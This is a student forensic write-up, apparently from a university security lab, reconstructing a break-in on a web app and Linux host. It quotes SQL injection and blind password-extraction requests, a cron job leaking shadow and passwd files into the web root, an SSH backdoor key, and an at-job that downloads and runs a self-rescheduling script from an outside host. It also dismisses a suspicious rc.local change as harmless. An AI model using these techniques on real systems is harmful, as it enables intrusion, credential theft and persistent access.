@@ -1,0 +1,540 @@
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++                     How HACKER gained access                          +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Please outline the steps the attacker took to gain access to the system.
+This can be broken down into different phases, based on their efforts
+to elevate privileges. Fill in the sections below that apply.
+
++-----------------------------------------------------------------------+
+| As unprivileged (system or services user) attackers approach was      |
++-----------------------------------------------------------------------+
+	A description of hackers approach, while an unprivileged user.
+
+		Assuming that the attacker is already on the fourFours page but is unprivileged, the attacker noticies the
+		login and password boxes upon loading in. The attacker approach initially is to try an SQL injection that
+		can allow the attacker access to the SERVICE and elevate his Privilege. 
+
+	-----------------------------------------------------------------
+	How I know: (command I executed, sample of the evidence, explanation)
+	-----------------------------------------------------------------
+	COMMAND: cat /var/log/postgresql/postgresql-8.3-main.log
+
+	EVIDENCE: (sample of the evidence)
+
+		2020-11-11 12:52:38 EST STATEMENT:  SELECT id, username, firstName, lastName, passwd FROM account WHERE username='' something ' AND passwd=''
+		2020-11-11 12:52:38 EST ERROR:  unnamed prepared statement does not exist
+		2020-11-11 12:54:09 EST ERROR:  unterminated quoted string at or near "' AND passwd=''" at character 89
+
+	EXPLANATION: (explain the evidence)
+
+		The statement SELECT id, username, firstName, lastName, passwd FROM account WHERE username='' something ' AND passwd='' indicates an SQL injection
+		as an attacker attempts to try and use SQL injection to expose an vulnerability in the web page. The attempt is a failure as the attacker is not
+		directly allowed access to service however the attacker now knows that an SQL injection is now possible to crack the web page. The attacker
+		attempts this at 12:52:38.
+
+	-----------------------------------------------------------------
+	COMMAND: cat /var/log/postgresql/postgresql-8.3-main.log
+
+	EVIDENCE: (sample of the evidence)
+
+		2020-11-11 12:54:09 EST STATEMENT:  SELECT id, username, firstName, lastName, passwd FROM account WHERE username=' ' OR 1=1;' AND passwd=''
+		2020-11-11 12:54:09 EST ERROR:  unnamed prepared statement does not exist
+		2020-11-11 13:06:21 EST ERROR:  syntax error at or near "something" at character 44
+
+	EXPLANATION: (explain the evidence)
+
+		From the previous attempt from SQL injection, the attacker now SQL injects using "OR 1=1" which will allow a pass through the login page. The
+		attacker knows that this will get them access through as the OR 1=1 will always return a true statement. With this, the attacker now elevates
+		his privilege to gain access to the service. The attackers gains access to service at 12:54:09.
+	-----------------------------------------------------------------
+
++-----------------------------------------------------------------------+
+| As Privileged for SERVICE the attackers approach was                  |
++-----------------------------------------------------------------------+
+	First SERVICE account broken: anne
+	Date and time attacker broke account: 11/Nov/2020:13:19:28
+	Evidence for the above (command, output, explanation): 
+
+		This can be seen in /var/log/apache2/access.log
+
+		The attacker that now has access to the service runs a script to crack all the usernames
+		and passwords of the database by using special condition that return yes or no. This special condition
+		is the "like" in the GET request shown below:
+
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27aa%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27ab%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		...
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27am%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27an%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65788 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27ana%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 588 "-" "Python-urllib/3.8"
+		...
+		172.16.107.140 - - [11/Nov/2020:13:19:28 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27anne%25%27+and+passwd+like+%27lion9%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 594 "-" "Python-urllib/3.8"
+
+	-----------------------------------------------------------------
+	A description of hackers approach, while an unprivileged user.
+
+		The attacker (172.16.107.140), uses the "like" to crack the passwords as it will return yes or no for each iteration of the python script.
+		As you can see in the above, it tries to crack anne first because its alphabetical and tries username like ab which return false/no. When
+		it gets to "an", it returns a true/yes and goes on to the next letter. This goes on until he gets anne, and the passwords lion. This gets
+		cracked first because it is probably the first entry in the database and/or its alphabetically first. As you can see Anne was cracked at
+		11/Nov/2020:13:19:28.
+
+	-----------------------------------------------------------------
+	How I know: (command I executed, sample of the evidence, explanation)
+	-----------------------------------------------------------------
+	COMMAND: cat /var/log/apache2/auth.log
+
+	EVIDENCE: (sample of the evidence)
+
+		Nov 11 13:00:01 ubuntuA3 sshd[5614]: Invalid user anne from 172.16.107.140
+		Nov 11 13:00:01 ubuntuA3 sshd[5614]: Failed none for invalid user anne from 172.16.107.140 port 60328 ssh2
+		Nov 11 13:00:05 ubuntuA3 sshd[5614]: pam_unix(sshd:auth): check pass; user unknown
+		Nov 11 13:00:05 ubuntuA3 sshd[5614]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.107.140 
+		Nov 11 13:00:07 ubuntuA3 sshd[5614]: Failed password for invalid user anne from 172.16.107.140 port 60328 ssh2
+		Nov 11 13:00:35 ubuntuA3 sshd[5614]: pam_unix(sshd:auth): check pass; user unknown
+		Nov 11 13:00:36 ubuntuA3 sshd[5614]: Failed password for invalid user anne from 172.16.107.140 port 60328 ssh2
+		Nov 11 13:00:40 ubuntuA3 sshd[5614]: pam_unix(sshd:auth): check pass; user unknown
+		Nov 11 13:00:42 ubuntuA3 sshd[5614]: Failed password for invalid user anne from 172.16.107.140 port 60328 ssh2
+		Nov 11 13:00:42 ubuntuA3 sshd[5614]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.107.140 
+		Nov 11 13:01:13 ubuntuA3 sshd[5617]: Invalid user steve from 172.16.107.140
+		Nov 11 13:01:13 ubuntuA3 sshd[5617]: Failed none for invalid user steve from 172.16.107.140 port 60330 ssh2
+		Nov 11 13:01:16 ubuntuA3 sshd[5617]: pam_unix(sshd:auth): check pass; user unknown
+		Nov 11 13:01:16 ubuntuA3 sshd[5617]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.107.140 
+		Nov 11 13:01:18 ubuntuA3 sshd[5617]: Failed password for invalid user steve from 172.16.107.140 port 60330 ssh2
+		Nov 11 13:01:20 ubuntuA3 sshd[5617]: pam_unix(sshd:auth): check pass; user unknown
+		Nov 11 13:01:22 ubuntuA3 sshd[5617]: Failed password for invalid user steve from 172.16.107.140 port 60330 ssh2
+		Nov 11 13:01:24 ubuntuA3 sshd[5617]: pam_unix(sshd:auth): check pass; user unknown
+		Nov 11 13:01:25 ubuntuA3 sshd[5617]: Failed password for invalid user steve from 172.16.107.140 port 60330 ssh2
+		Nov 11 13:01:25 ubuntuA3 sshd[5617]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.107.140 
+
+	EXPLANATION: (explain the evidence)
+
+		The attacker is now logged into the webpage and sees that that there are existing users, Anne Lion, Abagail Silver,
+		and Steve Mountain. The attacker then tries to use anne and steve to gain access to the system and become a system user.
+		This fails as the attacker does not know whether anne or steve is a system user and does not know their passwords if there
+		is any.
+
+	-----------------------------------------------------------------
+	COMMAND: cat /var/log/apache2/access.log
+
+	EVIDENCE: (sample of the evidence)
+
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27aa%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27ab%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		...
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27am%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27an%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 65788 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:19:26 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27ana%25%27+and+passwd+like+%27%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 588 "-" "Python-urllib/3.8"
+		...
+		172.16.107.140 - - [11/Nov/2020:13:19:28 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27anne%25%27+and+passwd+like+%27lion9%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 594 "-" "Python-urllib/3.8"
+		...
+		...
+		...
+		172.16.107.140 - - [11/Nov/2020:13:20:12 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27D%25%27+and+passwd+like+%27q%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:20:12 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27D%25%27+and+passwd+like+%27r%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:20:12 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27D%25%27+and+passwd+like+%27s%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:20:12 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27D%25%27+and+passwd+like+%27t%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+		172.16.107.140 - - [11/Nov/2020:13:20:12 -0500] "GET /fourFours/index.php?user=%27+or+%28username+like+%27D%25%27+and+passwd+like+%27u%25%27%29%3B+--&password=&operation=login HTTP/1.1" 200 587 "-" "Python-urllib/3.8"
+
+	EXPLANATION: (explain the evidence)
+
+		The attacker runs the script (the same one in the description) to crack all the usernames and passwords in the database is is successful in doing do. 
+		Once there are no more usernames and passwords to crack, the script stops and the attacker can use any of the usernames and passwords cracked to login
+		to the service.
+	-----------------------------------------------------------------
+
++-----------------------------------------------------------------------+
+| As a system user: before obtaining root                               |
++-----------------------------------------------------------------------+
+	First system account broken: bill
+	Date and time attacker broke account: Nov 11 13:24:53
+	Evidence for the above (command, output, explanation): 
+
+		As we can see in auth.log
+
+		Nov 11 13:24:47 ubuntuA3 sshd[11167]: Failed password for bill from 172.16.107.140 port 43044 ssh2
+		Nov 11 13:24:53 ubuntuA3 sshd[11167]: Accepted password for bill from 172.16.107.140 port 43044 ssh2
+		Nov 11 13:24:53 ubuntuA3 sshd[11170]: pam_unix(sshd:session): session opened for user bill by (uid=0)
+		Nov 11 13:33:46 ubuntuA3 sudo:     bill : TTY=pts/0 ; PWD=/home/bill ; USER=root ; COMMAND=/bin/bash
+		Nov 11 13:33:46 ubuntuA3 sudo: pam_unix(sudo:session): session opened for user root by bill(uid=0)
+
+	-----------------------------------------------------------------
+	A description of hackers approach, while an unprivileged user.
+
+		The attacker tries to log into bill and fails and then tries again	
+		and is successful in this attempt. The attempt works because the password for bill in the service
+		is the same for the system user so the attacker gains access to bill's system account.
+
+	-----------------------------------------------------------------
+	How I know: (command I executed, sample of the evidence, explanation)
+	-----------------------------------------------------------------
+	COMMAND: cat /var/log/auth.log
+
+	EVIDENCE: (sample of the evidence)
+
+		Nov 11 13:24:24 ubuntuA3 sshd[11165]: Invalid user anne from 172.16.107.140
+		Nov 11 13:24:24 ubuntuA3 sshd[11165]: Failed none for invalid user anne from 172.16.107.140 port 43042 ssh2
+		Nov 11 13:24:27 ubuntuA3 sshd[11165]: pam_unix(sshd:auth): check pass; user unknown
+		Nov 11 13:24:27 ubuntuA3 sshd[11165]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.107.140 
+		Nov 11 13:24:29 ubuntuA3 sshd[11165]: Failed password for invalid user anne from 172.16.107.140 port 43042 ssh2
+		Nov 11 13:24:32 ubuntuA3 sshd[11165]: pam_unix(sshd:auth): check pass; user unknown
+		Nov 11 13:24:34 ubuntuA3 sshd[11165]: Failed password for invalid user anne from 172.16.107.140 port 43042 ssh2
+		Nov 11 13:24:35 ubuntuA3 sshd[11165]: Failed password for invalid user anne from 172.16.107.140 port 43042 ssh2
+		Nov 11 13:24:35 ubuntuA3 sshd[11165]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.107.140 
+		Nov 11 13:24:45 ubuntuA3 sshd[11167]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.107.140  user=bill
+		Nov 11 13:24:47 ubuntuA3 sshd[11167]: Failed password for bill from 172.16.107.140 port 43044 ssh2
+		Nov 11 13:24:53 ubuntuA3 sshd[11167]: Accepted password for bill from 172.16.107.140 port 43044 ssh2
+		Nov 11 13:24:53 ubuntuA3 sshd[11170]: pam_unix(sshd:session): session opened for user bill by (uid=0)
+		Nov 11 13:33:46 ubuntuA3 sudo:     bill : TTY=pts/0 ; PWD=/home/bill ; USER=root ; COMMAND=/bin/bash
+		Nov 11 13:33:46 ubuntuA3 sudo: pam_unix(sudo:session): session opened for user root by bill(uid=0)
+
+	EXPLANATION: (explain the evidence)
+
+		After cracking the usernames and passwords for the service and doing a few attempts to login to the system
+		beforehand, the attacker then tries again to crack the system to gain access to a system user. The attacker
+		first tries Anne and fails however, when the attacker tries bill (probaby due to the fact that its next on 
+		the list) the attacker is successful in logging into the system user bill.
+
+	-----------------------------------------------------------------
+	COMMAND: cat /home/bill/.bash_history
+
+	EVIDENCE: (sample of the evidence)
+
+		more ~bill/.bash_history
+		history
+		tripwire --check
+		tripwire --check | more
+		pwd
+		tripwire --check > ~/tripwire_report.txt
+		vim tripwire_report.txt 
+		ls
+		mkdir ransom
+		mv tripwire_report.txt ransom/
+		ls
+		cd ransom
+		ls
+		mv /var/lib/tripwire/* .
+		ls
+		cd ..
+		ls
+		cd ransom/
+		ls
+		vim notes.txt
+		ls
+		gpg
+		ls
+		cd ..
+		ls
+		tar -zcf ransom ransom
+		tar -zcf ransom.tar.gz ransom
+		ls
+		rm -fr ransom
+		ls
+		gpg --symmetric ransom.tar.gz 
+		ls
+		mv ransom.tar.gz z
+		gpg ransom.tar.gz.gpg 
+		ls
+		rm ransom.tar.gz
+		rm z
+		mv ransom.tar.gz.gpg myPrivateFiles
+		ls
+		pwd
+		history
+		tripwire --check
+		shutdown -h now
+		sudo bash
+		cd /var/lib/tripwire/
+		ls
+		shutdown -h now
+
+
+	EXPLANATION: (explain the evidence)
+
+		The attacker which now has access to a system user, bill, decides to run a bunch of commands
+		and access files as bill. This is shown through the bash_history as the bash_history keeps a log
+		of commands used as that user. As we can see in the history the attacker checks tripwire and 
+		encrypts the tripwire_report making the admin unable to freely access the tripwire report.
+
+	-----------------------------------------------------------------
+
++-----------------------------------------------------------------------+
+| Privilege: Got root!!!                                                |
++-----------------------------------------------------------------------+
+	First system account broken: bill
+	Date and time attacker broke account: Nov 11 13:24:53
+	Evidence for the above (command, output, explanation): 
+
+		Looking at the auth.log, we can see that the attacker has cracked bill's account.
+		The attacker would then realize that the account that he has cracked has 
+		root access therefore by cracking bill's account, the attacker already has
+		gotten root.
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++                          System Changes                               +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+-------------------------------------------------------------------------
+HACKER CHANGED: Tripwire file in /var/lib/tripwire/tripwire_report.txt
+
+EVIDENCE: 
+
+	When you cd into /var/lib/tripwire , the tripwire report has been removed from
+	the system. Or so it seems. When you look at bill's .bash_history, we can see:
+
+		mkdir ransom
+		mv tripwire_report.txt ransom/
+		ls
+		cd ransom
+		ls
+		mv /var/lib/tripwire/* .
+		ls
+		cd ..
+		ls
+		cd ransom/
+		ls
+		vim notes.txt
+		ls
+		gpg
+		ls
+		cd ..
+		ls
+		tar -zcf ransom ransom
+		tar -zcf ransom.tar.gz ransom
+		ls
+		rm -fr ransom
+		ls
+		gpg --symmetric ransom.tar.gz 
+		ls
+		mv ransom.tar.gz z
+		gpg ransom.tar.gz.gpg 
+		ls
+		rm ransom.tar.gz
+		rm z
+		mv ransom.tar.gz.gpg myPrivateFiles
+
+	We can see here that the attacker has moved the tripwire report and all files in /var/lib/tripwire
+	and encrypted it into a file called myPrivateFiles
+
+WHY: 
+	
+	The attacker knowing that it has infiltrated the system probably knows that when logged into a user,
+	that it will leave traces behind and will trigger the tripwire. Given this, the attacker has locked all
+	the files in tripwire so that the root user cannot identify the changes done to the system.
+
+IMPACT OF CHANGE: hide tracks and exfiltrate data
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /etc/shadow and /etc/passwd
+
+EVIDENCE: 
+
+	We can see the file /etc/cron.hourly/backup has been accessed during time of attack:
+
+		-rwxr-xr-x  1 root root  193 2020-11-11 13:43 backup
+
+	In /etc/cron.hourly/backup , we can see these lines:
+
+		/bin/cat /etc/shadow | /usr/bin/tr '[A-Za-z:]' '[N-ZA-Mn-za-m.]' > /var/www/fourFours/.sh
+		/bin/cat /etc/passwd | /usr/bin/tr '[A-Za-z:]' '[N-ZA-Mn-za-m.]' > /var/www/fourFours/.pa
+	
+	So what cron means is a job and cron.hourly is a job every hour. That means that whatever is in cron.hourly
+	is executed every hour on the system. As we can see that /etc/passwd file and /etc/shadow file are encryped with 
+	a rot-13 algorithm in the hidden files .pa and .sh in the fourFours/ folder.
+
+WHY: 
+
+	It is being encrypted into fourFours is that everyone has access to so that the attacker can be up to date
+	to any changes to shadow and passwd file and can be cracked later on.
+
+IMPACT OF CHANGE: exfiltrate data and maintain access
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /home/charlie/.bash_history
+
+EVIDENCE: 
+
+		Nov 11 13:39:57 ubuntuA3 sshd[11266]: Accepted publickey for charlie from 172.16.107.140 port 43052 ssh2
+		Nov 11 13:39:57 ubuntuA3 sshd[11268]: pam_unix(sshd:session): session opened for user charlie by (uid=0)
+		Nov 11 13:39:59 ubuntuA3 sshd[11268]: Received disconnect from 172.16.107.140: 11: disconnected by user
+		Nov 11 13:39:59 ubuntuA3 sshd[11268]: pam_unix(sshd:session): session closed for user charlie
+
+	As we can see in /var/log/auth.log , that the attacker has logged into charlie user. There would exist a 
+	.bash_history that would log anything charlie has done but the file is missing
+
+WHY: 
+
+	The attacker logged into charlie has done some sort of attack using the user charlie but does 
+	not want anyone to trace his commands therefore the attacker deletes the .bash_history to do so
+
+IMPACT OF CHANGE: hide tracks
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /var/log/faillog
+
+EVIDENCE: 
+
+	While the faillog exists in /var/log/ , the file remains empty. faillog is meant to log any failed
+	attempts to log into a user and it shows user, time and date of when the user has failed to login 
+
+WHY: 
+
+	Given that the attacker is trying to crack users, the attacker does not want to make it obvious that 
+	someone is trying to attack the system. By deleting the faillog, the admin trying to check the faillog
+	would not be alarmed seeing that the faillog is empty.
+
+IMPACT OF CHANGE: hide tracks
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /etc/adjtime
+
+EVIDENCE:
+
+	If you ls -la in /etc/ :
+
+		-rw-r--r--  1 root root       44 2020-11-13 08:41 adjtime
+
+	you can see that adj was modified 2 days after the attack
+	which could or could not be related to an attack
+
+WHY: 
+
+	unknown
+
+IMPACT OF CHANGE: unknown
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /home/bill/.ssh/authorized_keys
+
+EVIDENCE: 
+
+	In /home/bill/.ssh/authorized_keys , it contains:
+
+		ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCu3afJbnOfkFYpPdZW5Y5AOuq0kKCzsY4M4IGktv0P32Rcx7zFKP5VhgxBKn7nZl+jDVgVbeuq+0QUFpIOSUAxNyAir/hKKt50MHalz5pVjW0komsCpXRSo7M6rGrYANL/JE/D9tvMNPwLz44ebHzaslXjITPW4yiEiOKFASHLFGqrFmgTYDxqfydkBTTeVmdQFDGGvwNs8InPKjFmeYXVzJyvrqMsZvkVPxlT7wpCWcccK194jj4nHIiIuvW7eU9IAOXUXgPbUYC1fSH60vZnavRbHQG0WGPaBpj9TQlzpwtr4PGXYfacOaN93dqnGvGw4tdLSMG1efiIoblKF2v80yuAphrUMKBdFPvp8hpXWHnWq5nqxhiazFYSPzqgyzl89iD2qyA5m38gWEkTzHsXSddOQF3+4eN/YfeCXsw0vsHSmDoRn5QsB3EsvBoCUITEuM9/Yh/YwxTD1HVSoGv10LqMZkk7M2X7giZtZjQ1qjGzQtC6DJepDrLX6ad0O0MhEdkkrqITyqK/ooGGoewXjcZQKLTdnk/137R2KnByo/Jh1dAAjcd6Y3XL2HbiM3nVaTU6vumnWqW+RRaCh2WXDPohIFhVA8RdZG5sWMzKIq4XF6qOtJBMLz/PBOqRv5M6y2inE6K+x1/kDV6AucISIMDyu92EGiethZCj6lwyLw== kali@kali
+
+	and in /var/log/auth.log , we can see:
+
+		Nov 11 14:18:14 ubuntuA3 sshd[11472]: Accepted publickey for bill from 172.16.107.140 port 43656 ssh2
+		Nov 11 14:18:14 ubuntuA3 sshd[11474]: pam_unix(sshd:session): session opened for user bill by (uid=0)
+		Nov 11 14:18:39 ubuntuA3 sudo:     bill : TTY=pts/0 ; PWD=/home/bill ; USER=root ; COMMAND=/bin/bash
+
+	we can see that by logging into bill, the rsa key is being used to log into bill
+
+WHY: 
+
+	This makes it easier for the attacker to log into the system user bill
+
+IMPACT OF CHANGE: ease of access and maintain access
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /etc/rc.local
+
+EVIDENCE: 
+
+		-rwxr-xr-x  1 root root      531 2020-11-11 14:15 rc.local
+
+	What rc.local does is that it runs whatever is in the rc.local on bootup of the server.
+	In rc.local we can see:
+
+		cp /etc/issue.bak /etc/issue
+
+		/sbin/ifconfig eth0 >> /etc/issue
+
+		# Fix for php5 session issue
+		echo "touch /var/www/.maintain_sessions.php" | at now + 3 days
+		echo "chmod 777 /var/www/.maintain_sessions.php" | at now + 4 days
+
+	which is nothing bad as it echos the ip + touches a file called .maintain_sessions.php but nothing 
+	serious gets attacked
+
+WHY: 
+
+	An attacker could have possibly wrote somehting in rc.local to run a script of somesort or have some malicious
+	program run when bootup potentially
+
+IMPACT OF CHANGE: exfiltrate data?
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /var/spool/cron/atjobs/a00001019882c9
+
+EVIDENCE: 
+
+	We can see the file being accessed during the time of attacking:
+
+		-rwx------ 1 root   daemon 2187 2020-11-11 13:49 a00001019882c9
+
+	Inside we can see:
+
+		#!/bin/sh
+		# atrun uid=0 gid=0
+		# mail bill 0
+		umask 22
+		USER=root; export USER
+		LS_COLORS=no=00:fi=00:di=01\;34:ln=01\;36:pi=40\;33:so=01\;35:do=01\;35:bd=40\;33\;01:cd=40\;33\;01:or=40\;31\;01:su=37\;41:sg=30\;43:tw=30\;42:ow=34\;42:st=37\;44:ex=01\;32:\*.tar=01\;31:\*.tgz=01\;31:\*.svgz=01\;31:\*.arj=01\;31:\*.taz=01\;31:\*.lzh=01\;31:\*.lzma=01\;31:\*.zip=01\;31:\*.z=01\;31:\*.Z=01\;31:\*.dz=01\;31:\*.gz=01\;31:\*.bz2=01\;31:\*.bz=01\;31:\*.tbz2=01\;31:\*.tz=01\;31:\*.deb=01\;31:\*.rpm=01\;31:\*.jar=01\;31:\*.rar=01\;31:\*.ace=01\;31:\*.zoo=01\;31:\*.cpio=01\;31:\*.7z=01\;31:\*.rz=01\;31:\*.jpg=01\;35:\*.jpeg=01\;35:\*.gif=01\;35:\*.bmp=01\;35:\*.pbm=01\;35:\*.pgm=01\;35:\*.ppm=01\;35:\*.tga=01\;35:\*.xbm=01\;35:\*.xpm=01\;35:\*.tif=01\;35:\*.tiff=01\;35:\*.png=01\;35:\*.svg=01\;35:\*.mng=01\;35:\*.pcx=01\;35:\*.mov=01\;35:\*.mpg=01\;35:\*.mpeg=01\;35:\*.m2v=01\;35:\*.mkv=01\;35:\*.ogm=01\;35:\*.mp4=01\;35:\*.m4v=01\;35:\*.mp4v=01\;35:\*.vob=01\;35:\*.qt=01\;35:\*.nuv=01\;35:\*.wmv=01\;35:\*.asf=01\;35:\*.rm=01\;35:\*.rmvb=01\;35:\*.flc=01\;35:\*.avi=01\;35:\*.fli=01\;35:\*.gl=01\;35:\*.dl=01\;35:\*.xcf=01\;35:\*.xwd=01\;35:\*.yuv=01\;35:\*.aac=00\;36:\*.au=00\;36:\*.flac=00\;36:\*.mid=00\;36:\*.midi=00\;36:\*.mka=00\;36:\*.mp3=00\;36:\*.mpc=00\;36:\*.ogg=00\;36:\*.ra=00\;36:\*.wav=00\;36:; export LS_COLORS
+		SUDO_USER=bill; export SUDO_USER
+		SUDO_UID=1001; export SUDO_UID
+		USERNAME=root; export USERNAME
+		PATH=/usr/lib/kde4/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/X11R6/bin; export PATH
+		MAIL=/var/mail/bill; export MAIL
+		PWD=/etc; export PWD
+		LANG=en_US.UTF-8; export LANG
+		HISTCONTROL=ignoreboth; export HISTCONTROL
+		SHLVL=1; export SHLVL
+		SUDO_COMMAND=/bin/bash; export SUDO_COMMAND
+		HOME=/home/bill; export HOME
+		LOGNAME=root; export LOGNAME
+		LESSOPEN=\|\ /usr/bin/lesspipe\ %s; export LESSOPEN
+		SUDO_GID=1001; export SUDO_GID
+		LESSCLOSE=/usr/bin/lesspipe\ %s\ %s; export LESSCLOSE
+		OLDPWD=/etc/cron.hourly; export OLDPWD
+		cd /etc || {
+			echo 'Execution directory inaccessible' >&2
+			exit 1
+		}
+		cd /tmp
+		rm maintain
+		wget --no-check-certificate http://axiom.utm.utoronto.ca/~csc347/20f/assignments/a3/maintain
+		chmod +x maintain
+		./maintain
+		rm maintain
+
+	From here maintain contains:
+
+		#!/bin/bash
+		usermod -a -G admin charlie 
+		at now + 2 weeks <<HERE
+		cd /tmp
+		rm maintain
+		wget --no-check-certificate http://axiom.utm.utoronto.ca/~csc347/20f/assignments/a3/maintain
+		chmod +x maintain
+		./maintain
+		rm maintain
+		HERE
+
+WHY: 
+
+	This could be connected to the previous change in rc.local and how /var/www/.maintain_sessions.php exists in that directory
+
+IMPACT OF CHANGE: unknown
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: 
+
+EVIDENCE: 
+
+WHY: 
+
+IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: 
+
+EVIDENCE: 
+
+WHY: 
+
+IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...) 
+-------------------------------------------------------------------------
+
